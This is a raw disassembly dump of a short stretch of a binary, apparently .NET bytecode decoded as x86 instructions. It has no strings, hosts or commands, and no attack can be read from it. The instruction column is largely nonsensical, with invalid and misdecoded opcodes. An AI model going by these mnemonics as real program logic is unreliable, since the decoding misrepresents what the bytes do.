  403c22:	39 06                	cmp    %eax,(%esi)
  403c24:	00 00                	add    %al,(%eax)
  403c26:	00 06                	add    %al,(%esi)
  403c28:	6f                   	outsl  %ds:(%esi),(%dx)
  403c29:	33 00                	xor    (%eax),%eax
  403c2b:	00 0a                	add    %cl,(%edx)
  403c2d:	dc 6f b3             	fsubrl -0x4d(%edi)
  403c30:	00 00                	add    %al,(%eax)
  403c32:	0a 28                	or     (%eax),%ch
  403c34:	49                   	dec    %ecx
  403c35:	00 00                	add    %al,(%eax)
  403c37:	06                   	push   %es
  403c38:	dd 00                	fldl   (%eax)
  403c3a:	00 00                	add    %al,(%eax)
  403c3c:	00 16                	add    %dl,(%esi)
  403c3e:	2a 07                	sub    (%edi),%al
  403c40:	2a 00                	sub    (%eax),%al
  403c42:	00 00                	add    %al,(%eax)
  403c44:	01 1c 00             	add    %ebx,(%eax,%eax,1)
  403c47:	00 02                	add    %al,(%edx)
  403c49:	00 11                	add    %dl,(%ecx)
  403c4b:	00 10                	add    %dl,(%eax)
  403c4d:	21 00                	and    %eax,(%eax)
  403c4f:	0d 00 00 00 00       	or     $0x0,%eax
  403c54:	00 00                	add    %al,(%eax)
  403c56:	00 00                	add    %al,(%eax)
  403c58:	2e 2e 00 0f          	cs add %cl,%cs:(%edi)
  403c5c:	31 00                	xor    %eax,(%eax)
  403c5e:	00 01                	add    %al,(%ecx)
  403c60:	1b 30                	sbb    (%eax),%esi
  403c62:	02 00                	add    (%eax),%al
  403c64:	42                   	inc    %edx
  403c65:	00 00                	add    %al,(%eax)
  403c67:	00 12                	add    %dl,(%edx)
  403c69:	00 00                	add    %al,(%eax)
  403c6b:	11 7e 65             	adc    %edi,0x65(%esi)
  403c6e:	00 00                	add    %al,(%eax)
  403c70:	0a 7e 23             	or     0x23(%esi),%bh
  403c73:	00 00                	add    %al,(%eax)
  403c75:	04 6f                	add    $0x6f,%al
  403c77:	b4 00                	mov    $0x0,%ah
  403c79:	00 0a                	add    %cl,(%edx)
  403c7b:	0a 06                	or     (%esi),%al
  403c7d:	02 6f b5             	add    -0x4b(%edi),%ch
  403c80:	00 00                	add    %al,(%eax)
  403c82:	0a 74 02 00          	or     0x0(%edx,%eax,1),%dh
  403c86:	00 1b                	add    %bl,(%ebx)
  403c88:	0b dd                	or     %ebp,%ebx
  403c8a:	1e                   	push   %ds
  403c8b:	00 00                	add    %al,(%eax)
  403c8d:	00 06                	add    %al,(%esi)
  403c8f:	39 06                	cmp    %eax,(%esi)
  403c91:	00 00                	add    %al,(%eax)
  403c93:	00 06                	add    %al,(%esi)
  403c95:	6f                   	outsl  %ds:(%esi),(%dx)
  403c96:	33 00                	xor    (%eax),%eax
  403c98:	00 0a                	add    %cl,(%edx)
  403c9a:	dc 6f b3             	fsubrl -0x4d(%edi)
  403c9d:	00 00                	add    %al,(%eax)
  403c9f:	0a 28                	or     (%eax),%ch
  403ca1:	49                   	dec    %ecx
  403ca2:	00 00                	add    %al,(%eax)
  403ca4:	06                   	push   %es
  403ca5:	dd 00                	fldl   (%eax)
  403ca7:	00 00                	add    %al,(%eax)
  403ca9:	00 14 2a             	add    %dl,(%edx,%ebp,1)
  403cac:	07                   	pop    %es
  403cad:	2a 00                	sub    (%eax),%al
  403caf:	00 01                	add    %al,(%ecx)
  403cb1:	1c 00                	sbb    $0x0,%al
  403cb3:	00 02                	add    %al,(%edx)
  403cb5:	00 10                	add    %dl,(%eax)
  403cb7:	00 12                	add    %dl,(%edx)
  403cb9:	22 00                	and    (%eax),%al
  403cbb:	0d 00 00 00 00       	or     $0x0,%eax
  403cc0:	00 00                	add    %al,(%eax)
  403cc2:	00 00                	add    %al,(%eax)
  403cc4:	2f                   	das
  403cc5:	2f                   	das
  403cc6:	00 0f                	add    %cl,(%edi)
  403cc8:	31 00                	xor    %eax,(%eax)
  403cca:	00 01                	add    %al,(%ecx)
  403ccc:	1b 30                	sbb    (%eax),%esi
  403cce:	02 00                	add    (%eax),%al
  403cd0:	3e 00 00             	add    %al,%ds:(%eax)
  403cd3:	00 11                	add    %dl,(%ecx)
  403cd5:	00 00                	add    %al,(%eax)
  403cd7:	11 7e 65             	adc    %edi,0x65(%esi)
  403cda:	00 00                	add    %al,(%eax)
  403cdc:	0a 7e 23             	or     0x23(%esi),%bh
  403cdf:	00 00                	add    %al,(%eax)
  403ce1:	04 6f                	add    $0x6f,%al
  403ce3:	b4 00                	mov    $0x0,%ah
  403ce5:	00 0a                	add    %cl,(%edx)
  403ce7:	0a 06                	or     (%esi),%al
  403ce9:	02 6f b6             	add    -0x4a(%edi),%ch
  403cec:	00 00                	add    %al,(%eax)
  403cee:	0a 17                	or     (%edi),%dl
  403cf0:	0b dd                	or     %ebp,%ebx
  403cf2:	1e                   	push   %ds
  403cf3:	00 00                	add    %al,(%eax)
  403cf5:	00 06                	add    %al,(%esi)
  403cf7:	39 06                	cmp    %eax,(%esi)
  403cf9:	00 00                	add    %al,(%eax)
  403cfb:	00 06                	add    %al,(%esi)
  403cfd:	6f                   	outsl  %ds:(%esi),(%dx)
  403cfe:	33 00                	xor    (%eax),%eax
  403d00:	00 0a                	add    %cl,(%edx)
  403d02:	dc 6f b3             	fsubrl -0x4d(%edi)
  403d05:	00 00                	add    %al,(%eax)
  403d07:	0a 28                	or     (%eax),%ch
  403d09:	49                   	dec    %ecx
  403d0a:	00 00                	add    %al,(%eax)
  403d0c:	06                   	push   %es
  403d0d:	dd 00                	fldl   (%eax)
  403d0f:	00 00                	add    %al,(%eax)
  403d11:	00 16                	add    %dl,(%esi)
  403d13:	2a 07                	sub    (%edi),%al
  403d15:	2a 00                	sub    (%eax),%al
  403d17:	00 01                	add    %al,(%ecx)
  403d19:	1c 00                	sbb    $0x0,%al
  403d1b:	00 02                	add    %al,(%edx)
  403d1d:	00 10                	add    %dl,(%eax)
  403d1f:	00 0e                	add    %cl,(%esi)
  403d21:	1e                   	push   %ds
  403d22:	00 0d 00 00 00 00    	add    %cl,0x0
  403d28:	00 00                	add    %al,(%eax)
  403d2a:	00 00                	add    %al,(%eax)
  403d2c:	2b 2b                	sub    (%ebx),%ebp
  403d2e:	00 0f                	add    %cl,(%edi)
  403d30:	31 00                	xor    %eax,(%eax)
  403d32:	00 01                	add    %al,(%ecx)
  403d34:	1b 30                	sbb    (%eax),%esi
  403d36:	03 00                	add    (%eax),%eax
  403d38:	43                   	inc    %ebx
  403d39:	00 00                	add    %al,(%eax)
  403d3b:	00 11                	add    %dl,(%ecx)
  403d3d:	00 00                	add    %al,(%eax)
  403d3f:	11 7e 65             	adc    %edi,0x65(%esi)
  403d42:	00 00                	add    %al,(%eax)
  403d44:	0a 72 67             	or     0x67(%edx),%dh
  403d47:	03 00                	add    (%eax),%eax
  403d49:	70 17                	jo     0x403d62
  403d4b:	6f                   	outsl  %ds:(%esi),(%dx)
  403d4c:	b7 00                	mov    $0x0,%bh
  403d4e:	00 0a                	add    %cl,(%edx)
  403d50:	0a 06                	or     (%esi),%al
  403d52:	7e 23                	jle    0x403d77
  403d54:	00 00                	add    %al,(%eax)
  403d56:	04 6f                	add    $0x6f,%al
  403d58:	b8 00 00 0a 17       	mov    $0x170a0000,%eax
  403d5d:	0b dd                	or     %ebp,%ebx
  403d5f:	1e                   	push   %ds
  403d60:	00 00                	add    %al,(%eax)
  403d62:	00 06                	add    %al,(%esi)
  403d64:	39 06                	cmp    %eax,(%esi)
  403d66:	00 00                	add    %al,(%eax)
  403d68:	00 06                	add    %al,(%esi)
  403d6a:	6f                   	outsl  %ds:(%esi),(%dx)
  403d6b:	33 00                	xor    (%eax),%eax
  403d6d:	00 0a                	add    %cl,(%edx)
  403d6f:	dc 6f b3             	fsubrl -0x4d(%edi)
  403d72:	00 00                	add    %al,(%eax)
  403d74:	0a 28                	or     (%eax),%ch
  403d76:	49                   	dec    %ecx
  403d77:	00 00                	add    %al,(%eax)
  403d79:	06                   	push   %es
  403d7a:	dd 00                	fldl   (%eax)
  403d7c:	00 00                	add    %al,(%eax)
  403d7e:	00 16                	add    %dl,(%esi)
  403d80:	2a 07                	sub    (%edi),%al
  403d82:	2a 00                	sub    (%eax),%al
  403d84:	01 1c 00             	add    %ebx,(%eax,%eax,1)
  403d87:	00 02                	add    %al,(%edx)
  403d89:	00 11                	add    %dl,(%ecx)
  403d8b:	00 12                	add    %dl,(%edx)
  403d8d:	23 00                	and    (%eax),%eax
  403d8f:	0d 00 00 00 00       	or     $0x0,%eax
  403d94:	00 00                	add    %al,(%eax)
  403d96:	00 00                	add    %al,(%eax)
  403d98:	30 30                	xor    %dh,(%eax)
  403d9a:	00 0f                	add    %cl,(%edi)
  403d9c:	31 00                	xor    %eax,(%eax)
  403d9e:	00 01                	add    %al,(%ecx)
  403da0:	1b 30                	sbb    (%eax),%esi
  403da2:	04 00                	add    $0x0,%al
  403da4:	dc 01                	faddl  (%ecx)
  403da6:	00 00                	add    %al,(%eax)
  403da8:	13 00                	adc    (%eax),%eax
  403daa:	00 11                	add    %dl,(%ecx)
  403dac:	73 94                	jae    0x403d42
  403dae:	00 00                	add    %al,(%eax)
  403db0:	06                   	push   %es
  403db1:	0a 06                	or     (%esi),%al
  403db3:	02 74 02 00          	add    0x0(%edx,%eax,1),%dh
  403db7:	00 1b                	add    %bl,(%ebx)
  403db9:	6f                   	outsl  %ds:(%esi),(%dx)
  403dba:	86 00                	xchg   %al,(%eax)
  403dbc:	00 06                	add    %al,(%esi)
  403dbe:	06                   	push   %es
  403dbf:	72 62                	jb     0x403e23
  403dc1:	21 00                	and    %eax,(%eax)
  403dc3:	70 6f                	jo     0x403e34
  403dc5:	7f 00                	jg     0x403dc7
  403dc7:	00 06                	add    %al,(%esi)
  403dc9:	6f                   	outsl  %ds:(%esi),(%dx)
  403dca:	8b 00                	mov    (%eax),%eax
  403dcc:	00 06                	add    %al,(%esi)
  403dce:	0b 07                	or     (%edi),%eax
  403dd0:	72 c2                	jb     0x403d94
  403dd2:	25 00 70 28 25       	and    $0x25287000,%eax
  403dd7:	00 00                	add    %al,(%eax)
  403dd9:	0a 3a                	or     (%edx),%bh
  403ddb:	25 00 00 00 07       	and    $0x7000000,%eax
  403de0:	72 cc                	jb     0x403dae
  403de2:	25 00 70 28 25       	and    $0x25287000,%eax
  403de7:	00 00                	add    %al,(%eax)
  403de9:	0a 3a                	or     (%edx),%bh
  403deb:	60                   	pusha
  403dec:	00 00                	add    %al,(%eax)
  403dee:	00 07                	add    %al,(%edi)
  403df0:	72 da                	jb     0x403dcc
  403df2:	25 00 70 28 25       	and    $0x25287000,%eax
  403df7:	00 00                	add    %al,(%eax)
  403df9:	0a 3a                	or     (%edx),%bh
  403dfb:	d9 00                	flds   (%eax)
  403dfd:	00 00                	add    %al,(%eax)
  403dff:	38 6f 01             	cmp    %ch,0x1(%edi)
  403e02:	00 00                	add    %al,(%eax)
  403e04:	16                   	push   %ss
  403e05:	28 1a                	sub    %bl,(%edx)
  403e07:	00 00                	add    %al,(%eax)
  403e09:	06                   	push   %es
  403e0a:	73 94                	jae    0x403da0
  403e0c:	00 00                	add    %al,(%eax)
  403e0e:	06                   	push   %es
  403e0f:	25 72 62 21 00       	and    $0x216272,%eax
  403e14:	70 6f                	jo     0x403e85
  403e16:	7f 00                	jg     0x403e18
  403e18:	00 06                	add    %al,(%esi)
  403e1a:	72 c2                	jb     0x403dde
  403e1c:	25 00 70 6f 81       	and    $0x816f7000,%eax
  403e21:	00 00                	add    %al,(%eax)
  403e23:	06                   	push   %es
  403e24:	25 72 7a 21 00       	and    $0x217a72,%eax
  403e29:	70 6f                	jo     0x403e9a
  403e2b:	7f 00                	jg     0x403e2d
  403e2d:	00 06                	add    %al,(%esi)
  403e2f:	28 17                	sub    %dl,(%edi)
  403e31:	00 00                	add    %al,(%eax)
  403e33:	06                   	push   %es
  403e34:	6a 6f                	push   $0x6f
  403e36:	74 00                	je     0x403e38
  403e38:	00 06                	add    %al,(%esi)
  403e3a:	6f                   	outsl  %ds:(%esi),(%dx)
  403e3b:	89 00                	mov    %eax,(%eax)
  403e3d:	00 06                	add    %al,(%esi)
  403e3f:	28 20                	sub    %ah,(%eax)
  403e41:	00 00                	add    %al,(%eax)
  403e43:	06                   	push   %es
  403e44:	16                   	push   %ss
  403e45:	28 18                	sub    %bl,(%eax)
  403e47:	00 00                	add    %al,(%eax)
  403e49:	06                   	push   %es
  403e4a:	38 24 01             	cmp    %ah,(%ecx,%eax,1)
  403e4d:	00 00                	add    %al,(%eax)
  403e4f:	00 06                	add    %al,(%esi)
  403e51:	72 f0                	jb     0x403e43
  403e53:	25 00 70 6f 7f       	and    $0x7f6f7000,%eax
  403e58:	00 00                	add    %al,(%eax)
  403e5a:	06                   	push   %es
  403e5b:	6f                   	outsl  %ds:(%esi),(%dx)
  403e5c:	8b 00                	mov    (%eax),%eax
  403e5e:	00 06                	add    %al,(%esi)
  403e60:	28 42 00             	sub    %al,0x0(%edx)
  403e63:	00 06                	add    %al,(%esi)
  403e65:	3a 54 00 00          	cmp    0x0(%eax,%eax,1),%dl
  403e69:	00 7e 24             	add    %bh,0x24(%esi)
  403e6c:	00 00                	add    %al,(%eax)
  403e6e:	04 06                	add    $0x6,%al
  403e70:	6f                   	outsl  %ds:(%esi),(%dx)
  403e71:	b9 00 00 0a 73       	mov    $0x730a0000,%ecx
  403e76:	94                   	xchg   %eax,%esp
  403e77:	00 00                	add    %al,(%eax)
  403e79:	06                   	push   %es
  403e7a:	25 72 62 21 00       	and    $0x216272,%eax
  403e7f:	70 6f                	jo     0x403ef0
  403e81:	7f 00                	jg     0x403e83
  403e83:	00 06                	add    %al,(%esi)
  403e85:	72 f8                	jb     0x403e7f
  403e87:	25 00 70 6f 81       	and    $0x816f7000,%eax
  403e8c:	00 00                	add    %al,(%eax)
  403e8e:	06                   	push   %es
  403e8f:	25 72 0e 26 00       	and    $0x260e72,%eax
  403e94:	70 6f                	jo     0x403f05
  403e96:	7f 00                	jg     0x403e98
  403e98:	00 06                	add    %al,(%esi)
  403e9a:	06                   	push   %es
  403e9b:	72 f0                	jb     0x403e8d
  403e9d:	25 00 70 6f 7f       	and    $0x7f6f7000,%eax
  403ea2:	00 00                	add    %al,(%eax)
  403ea4:	06                   	push   %es
  403ea5:	6f                   	outsl  %ds:(%esi),(%dx)
  403ea6:	8b 00                	mov    (%eax),%eax
  403ea8:	00 06                	add    %al,(%esi)
  403eaa:	6f                   	outsl  %ds:(%esi),(%dx)
  403eab:	81 00 00 06 6f 89    	addl   $0x896f0600,(%eax)
  403eb1:	00 00                	add    %al,(%eax)
  403eb3:	06                   	push   %es
  403eb4:	28 20                	sub    %ah,(%eax)
  403eb6:	00 00                	add    %al,(%eax)
  403eb8:	06                   	push   %es
  403eb9:	38 06                	cmp    %al,(%esi)
  403ebb:	00 00                	add    %al,(%eax)
  403ebd:	00 06                	add    %al,(%esi)
  403ebf:	28 47 00             	sub    %al,0x0(%edi)
  403ec2:	00 06                	add    %al,(%esi)
  403ec4:	dd aa 00 00 00 6f    	(bad) 0x6f000000(%edx)
  403eca:	b3 00                	mov    $0x0,%bl
  403ecc:	00 0a                	add    %cl,(%edx)
  403ece:	28 49 00             	sub    %cl,0x0(%ecx)
  403ed1:	00 06                	add    %al,(%esi)
  403ed3:	dd 9b 00 00 00 06    	fstpl  0x6000000(%ebx)
  403ed9:	72 1c                	jb     0x403ef7
  403edb:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  403edf:	7f 00                	jg     0x403ee1
  403ee1:	00 06                	add    %al,(%esi)
  403ee3:	6f                   	outsl  %ds:(%esi),(%dx)
  403ee4:	8b 00                	mov    (%eax),%eax
  403ee6:	00 06                	add    %al,(%esi)
  403ee8:	06                   	push   %es
  403ee9:	72 f0                	jb     0x403edb
  403eeb:	25 00 70 6f 7f       	and    $0x7f6f7000,%eax
  403ef0:	00 00                	add    %al,(%eax)
  403ef2:	06                   	push   %es
  403ef3:	6f                   	outsl  %ds:(%esi),(%dx)
  403ef4:	7a 00                	jp     0x403ef6
  403ef6:	00 06                	add    %al,(%esi)
  403ef8:	28 41 00             	sub    %al,0x0(%ecx)
  403efb:	00 06                	add    %al,(%esi)
  403efd:	26 7e 24             	es jle 0x403f24
  403f00:	00 00                	add    %al,(%eax)
  403f02:	04 28                	add    $0x28,%al
  403f04:	01 00                	add    %eax,(%eax)
  403f06:	00 2b                	add    %ch,(%ebx)
  403f08:	6f                   	outsl  %ds:(%esi),(%dx)
  403f09:	bb 00 00 0a 0c       	mov    $0xc0a0000,%ebx
  403f0e:	38 44 00 00          	cmp    %al,0x0(%eax,%eax,1)
  403f12:	00 12                	add    %dl,(%edx)
  403f14:	02 28                	add    (%eax),%ch
  403f16:	bc 00 00 0a 0d       	mov    $0xd0a0000,%esp
  403f1b:	09 72 f0             	or     %esi,-0x10(%edx)
  403f1e:	25 00 70 6f 7f       	and    $0x7f6f7000,%eax
  403f23:	00 00                	add    %al,(%eax)
  403f25:	06                   	push   %es
  403f26:	6f                   	outsl  %ds:(%esi),(%dx)
  403f27:	8b 00                	mov    (%eax),%eax
  403f29:	00 06                	add    %al,(%esi)
  403f2b:	06                   	push   %es
  403f2c:	72 1c                	jb     0x403f4a
  403f2e:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  403f32:	7f 00                	jg     0x403f34
  403f34:	00 06                	add    %al,(%esi)
  403f36:	6f                   	outsl  %ds:(%esi),(%dx)
  403f37:	8b 00                	mov    (%eax),%eax
  403f39:	00 06                	add    %al,(%esi)
  403f3b:	28 25 00 00 0a 39    	sub    %ah,0x390a0000
  403f41:	12 00                	adc    (%eax),%al
  403f43:	00 00                	add    %al,(%eax)
  403f45:	09 28                	or     %ebp,(%eax)
  403f47:	47                   	inc    %edi
  403f48:	00 00                	add    %al,(%eax)
  403f4a:	06                   	push   %es
  403f4b:	7e 24                	jle    0x403f71
  403f4d:	00 00                	add    %al,(%eax)
  403f4f:	04 09                	add    $0x9,%al
  403f51:	6f                   	outsl  %ds:(%esi),(%dx)
  403f52:	bd 00 00 0a 26       	mov    $0x260a0000,%ebp
  403f57:	12 02                	adc    (%edx),%al
  403f59:	28 be 00 00 0a 2d    	sub    %bh,0x2d0a0000(%esi)
  403f5f:	b3 dd                	mov    $0xdd,%bl
  403f61:	0e                   	push   %cs
  403f62:	00 00                	add    %al,(%eax)
  403f64:	00 12                	add    %dl,(%edx)
  403f66:	02 fe                	add    %dh,%bh
  403f68:	16                   	push   %ss
  403f69:	04 00                	add    $0x0,%al
  403f6b:	00 1b                	add    %bl,(%ebx)
  403f6d:	6f                   	outsl  %ds:(%esi),(%dx)
  403f6e:	33 00                	xor    (%eax),%eax
  403f70:	00 0a                	add    %cl,(%edx)
  403f72:	dc dd                	(bad)
  403f74:	0f 00 00             	sldt   (%eax)
  403f77:	00 6f b3             	add    %ch,-0x4d(%edi)
  403f7a:	00 00                	add    %al,(%eax)
  403f7c:	0a 28                	or     (%eax),%ch
  403f7e:	49                   	dec    %ecx
  403f7f:	00 00                	add    %al,(%eax)
  403f81:	06                   	push   %es
  403f82:	dd 00                	fldl   (%eax)
  403f84:	00 00                	add    %al,(%eax)
  403f86:	00 2a                	add    %ch,(%edx)
  403f88:	41                   	inc    %ecx
  403f89:	4c                   	dec    %esp
  403f8a:	00 00                	add    %al,(%eax)
  403f8c:	00 00                	add    %al,(%eax)
  403f8e:	00 00                	add    %al,(%eax)
  403f90:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  403f91:	00 00                	add    %al,(%eax)
  403f93:	00 79 00             	add    %bh,0x0(%ecx)
  403f96:	00 00                	add    %al,(%eax)
  403f98:	1d 01 00 00 0f       	sbb    $0xf000001,%eax
  403f9d:	00 00                	add    %al,(%eax)
  403f9f:	00 31                	add    %dh,(%ecx)
  403fa1:	00 00                	add    %al,(%eax)
  403fa3:	01 02                	add    %eax,(%edx)
  403fa5:	00 00                	add    %al,(%eax)
  403fa7:	00 62 01             	add    %ah,0x1(%edx)
  403faa:	00 00                	add    %al,(%eax)
  403fac:	57                   	push   %edi
  403fad:	00 00                	add    %al,(%eax)
  403faf:	00 b9 01 00 00 0e    	add    %bh,0xe000001(%ecx)
	...
  403fc1:	00 00                	add    %al,(%eax)
  403fc3:	00 cc                	add    %cl,%ah
  403fc5:	01 00                	add    %eax,(%eax)
  403fc7:	00 cc                	add    %cl,%ah
  403fc9:	01 00                	add    %eax,(%eax)
  403fcb:	00 0f                	add    %cl,(%edi)
  403fcd:	00 00                	add    %al,(%eax)
  403fcf:	00 31                	add    %dh,(%ecx)
  403fd1:	00 00                	add    %al,(%eax)
  403fd3:	01 13                	add    %edx,(%ebx)
  403fd5:	30 0b                	xor    %cl,(%ebx)
  403fd7:	00 11                	add    %dl,(%ecx)
  403fd9:	01 00                	add    %eax,(%eax)
  403fdb:	00 14 00             	add    %dl,(%eax,%eax,1)
  403fde:	00 11                	add    %dl,(%ecx)
  403fe0:	28 bf 00 00 0a 02    	sub    %bh,0x20a0000(%edi)
  403fe6:	72 f0                	jb     0x403fd8
  403fe8:	25 00 70 6f 7f       	and    $0x7f6f7000,%eax
  403fed:	00 00                	add    %al,(%eax)
  403fef:	06                   	push   %es
  403ff0:	6f                   	outsl  %ds:(%esi),(%dx)
  403ff1:	8b 00                	mov    (%eax),%eax
  403ff3:	00 06                	add    %al,(%esi)
  403ff5:	28 42 00             	sub    %al,0x0(%edx)
  403ff8:	00 06                	add    %al,(%esi)
  403ffa:	28 a2 00 00 06 6f    	sub    %ah,0x6f060000(%edx)
  404000:	c0 00 00             	rolb   $0x0,(%eax)
  404003:	0a 72 26             	or     0x26(%edx),%dh
  404006:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  40400a:	c1 00 00             	roll   $0x0,(%eax)
  40400d:	0a 28                	or     (%eax),%ch
  40400f:	c2 00 00             	ret    $0x0
  404012:	0a 0a                	or     (%edx),%cl
  404014:	7e 25                	jle    0x40403b
  404016:	00 00                	add    %al,(%eax)
  404018:	04 3a                	add    $0x3a,%al
  40401a:	85 00                	test   %eax,(%eax)
  40401c:	00 00                	add    %al,(%eax)
  40401e:	20 00                	and    %al,(%eax)
  404020:	01 00                	add    %eax,(%eax)
  404022:	00 72 42             	add    %dh,0x42(%edx)
  404025:	26 00 70 14          	add    %dh,%es:0x14(%eax)
  404029:	d0 0f                	rorb   $1,(%edi)
  40402b:	00 00                	add    %al,(%eax)
  40402d:	02 28                	add    (%eax),%ch
  40402f:	c3                   	ret
  404030:	00 00                	add    %al,(%eax)
  404032:	0a 1f                	or     (%edi),%bl
  404034:	09 8d 7e 00 00 01    	or     %ecx,0x100007e(%ebp)
  40403a:	25 16 16 14 28       	and    $0x28141616,%eax
  40403f:	c4 00                	les    (%eax),%eax
  404041:	00 0a                	add    %cl,(%edx)
  404043:	a2 25 17 17 14       	mov    %al,0x14171725
  404048:	28 c4                	sub    %al,%ah
  40404a:	00 00                	add    %al,(%eax)
  40404c:	0a a2 25 18 17 14    	or     0x14171825(%edx),%ah
  404052:	28 c4                	sub    %al,%ah
  404054:	00 00                	add    %al,(%eax)
  404056:	0a a2 25 19 17 14    	or     0x14171925(%edx),%ah
  40405c:	28 c4                	sub    %al,%ah
  40405e:	00 00                	add    %al,(%eax)
  404060:	0a a2 25 1a 17 14    	or     0x14171a25(%edx),%ah
  404066:	28 c4                	sub    %al,%ah
  404068:	00 00                	add    %al,(%eax)
  40406a:	0a a2 25 1b 17 14    	or     0x14171b25(%edx),%ah
  404070:	28 c4                	sub    %al,%ah
  404072:	00 00                	add    %al,(%eax)
  404074:	0a a2 25 1c 17 14    	or     0x14171c25(%edx),%ah
  40407a:	28 c4                	sub    %al,%ah
  40407c:	00 00                	add    %al,(%eax)
  40407e:	0a a2 25 1d 17 14    	or     0x14171d25(%edx),%ah
  404084:	28 c4                	sub    %al,%ah
  404086:	00 00                	add    %al,(%eax)
  404088:	0a a2 25 1e 17 14    	or     0x14171e25(%edx),%ah
  40408e:	28 c4                	sub    %al,%ah
  404090:	00 00                	add    %al,(%eax)
  404092:	0a a2 28 c5 00 00    	or     0xc528(%edx),%ah
  404098:	0a 28                	or     (%eax),%ch
  40409a:	c6 00 00             	movb   $0x0,(%eax)
  40409d:	0a 80 25 00 00 04    	or     0x4000025(%eax),%al
  4040a3:	7e 25                	jle    0x4040ca
  4040a5:	00 00                	add    %al,(%eax)
  4040a7:	04 7b                	add    $0x7b,%al
  4040a9:	c7 00 00 0a 7e 25    	movl   $0x257e0a00,(%eax)
  4040af:	00 00                	add    %al,(%eax)
  4040b1:	04 06                	add    $0x6,%al
  4040b3:	28 06                	sub    %al,(%esi)
  4040b5:	00 00                	add    %al,(%eax)
  4040b7:	06                   	push   %es
  4040b8:	7e 0b                	jle    0x4040c5
  4040ba:	00 00                	add    %al,(%eax)
  4040bc:	04 7e                	add    $0x7e,%al
  4040be:	10 00                	adc    %al,(%eax)
  4040c0:	00 04 02             	add    %al,(%edx,%eax,1)
  4040c3:	72 4a                	jb     0x40410f
  4040c5:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  4040c9:	7f 00                	jg     0x4040cb
  4040cb:	00 06                	add    %al,(%esi)
  4040cd:	6f                   	outsl  %ds:(%esi),(%dx)
  4040ce:	7a 00                	jp     0x4040d0
  4040d0:	00 06                	add    %al,(%esi)
  4040d2:	7e 1e                	jle    0x4040f2
  4040d4:	00 00                	add    %al,(%eax)
  4040d6:	04 7e                	add    $0x7e,%al
  4040d8:	08 00                	or     %al,(%eax)
  4040da:	00 04 7e             	add    %al,(%esi,%edi,2)
  4040dd:	0f 00 00             	sldt   (%eax)
  4040e0:	04 7e                	add    $0x7e,%al
  4040e2:	04 00                	add    $0x0,%al
  4040e4:	00 04 6f             	add    %al,(%edi,%ebp,2)
  4040e7:	c8 00 00 0a          	enter  $0x0,$0xa
  4040eb:	28 48 00             	sub    %cl,0x0(%eax)
  4040ee:	00 06                	add    %al,(%esi)
  4040f0:	2a 00                	sub    (%eax),%al
  4040f2:	00 00                	add    %al,(%eax)
  4040f4:	1b 30                	sbb    (%eax),%esi
  4040f6:	03 00                	add    (%eax),%eax
  4040f8:	5c                   	pop    %esp
  4040f9:	00 00                	add    %al,(%eax)
  4040fb:	00 15 00 00 11 02    	add    %dl,0x2110000
  404101:	28 18                	sub    %bl,(%eax)
  404103:	00 00                	add    %al,(%eax)
  404105:	0a 03                	or     (%ebx),%al
  404107:	28 ca                	sub    %cl,%dl
  404109:	00 00                	add    %al,(%eax)
  40410b:	0a 39                	or     (%ecx),%bh
  40410d:	0b 00                	or     (%eax),%eax
  40410f:	00 00                	add    %al,(%eax)
  404111:	72 78                	jb     0x40418b
  404113:	26 00 70 73          	add    %dh,%es:0x73(%eax)
  404117:	cb                   	lret
  404118:	00 00                	add    %al,(%eax)
  40411a:	0a 7a 03             	or     0x3(%edx),%bh
  40411d:	7e 2c                	jle    0x40414b
  40411f:	00 00                	add    %al,(%eax)
  404121:	04 20                	add    $0x20,%al
  404123:	50                   	push   %eax
  404124:	c3                   	ret
  404125:	00 00                	add    %al,(%eax)
  404127:	73 cc                	jae    0x4040f5
  404129:	00 00                	add    %al,(%eax)
  40412b:	0a 0a                	or     (%edx),%cl
  40412d:	02 06                	add    (%esi),%al
  40412f:	1f                   	pop    %ds
  404130:	20 6f cd             	and    %ch,-0x33(%edi)
  404133:	00 00                	add    %al,(%eax)
  404135:	0a 7d 2a             	or     0x2a(%ebp),%bh
  404138:	00 00                	add    %al,(%eax)
  40413a:	04 02                	add    $0x2,%al
  40413c:	06                   	push   %es
  40413d:	1f                   	pop    %ds
  40413e:	40                   	inc    %eax
  40413f:	6f                   	outsl  %ds:(%esi),(%dx)
  404140:	cd 00                	int    $0x0
  404142:	00 0a                	add    %cl,(%edx)
  404144:	7d 2b                	jge    0x404171
  404146:	00 00                	add    %al,(%eax)
  404148:	04 dd                	add    $0xdd,%al
  40414a:	0d 00 00 00 06       	or     $0x6000000,%eax
  40414f:	39 06                	cmp    %eax,(%esi)
  404151:	00 00                	add    %al,(%eax)
  404153:	00 06                	add    %al,(%esi)
  404155:	6f                   	outsl  %ds:(%esi),(%dx)
  404156:	33 00                	xor    (%eax),%eax
  404158:	00 0a                	add    %cl,(%edx)
  40415a:	dc 2a                	fsubrl (%edx)
  40415c:	01 10                	add    %edx,(%eax)
  40415e:	00 00                	add    %al,(%eax)
  404160:	02 00                	add    (%eax),%al
  404162:	2d 00 21 4e 00       	sub    $0x4e2100,%eax
  404167:	0d 00 00 00 00       	or     $0x0,%eax
  40416c:	1b 30                	sbb    (%eax),%esi
  40416e:	05 00 15 01 00       	add    $0x11500,%eax
  404173:	00 16                	add    %dl,(%esi)
  404175:	00 00                	add    %al,(%eax)
  404177:	11 03                	adc    %eax,(%ebx)
  404179:	3a 0b                	cmp    (%ebx),%cl
  40417b:	00 00                	add    %al,(%eax)
  40417d:	00 72 c0             	add    %dh,-0x40(%edx)
  404180:	26 00 70 73          	add    %dh,%es:0x73(%eax)
  404184:	cf                   	iret
  404185:	00 00                	add    %al,(%eax)
  404187:	0a 7a 73             	or     0x73(%edx),%bh
  40418a:	d0 00                	rolb   $1,(%eax)
  40418c:	00 0a                	add    %cl,(%edx)
  40418e:	0a 06                	or     (%esi),%al
  404190:	1f                   	pop    %ds
  404191:	20 6a 6f             	and    %ch,0x6f(%edx)
  404194:	4e                   	dec    %esi
  404195:	00 00                	add    %al,(%eax)
  404197:	0a 73 d1             	or     -0x2f(%ebx),%dh
  40419a:	00 00                	add    %al,(%eax)
  40419c:	0a 0b                	or     (%ebx),%cl
  40419e:	07                   	pop    %es
  40419f:	20 00                	and    %al,(%eax)
  4041a1:	01 00                	add    %eax,(%eax)
  4041a3:	00 6f d2             	add    %ch,-0x2e(%edi)
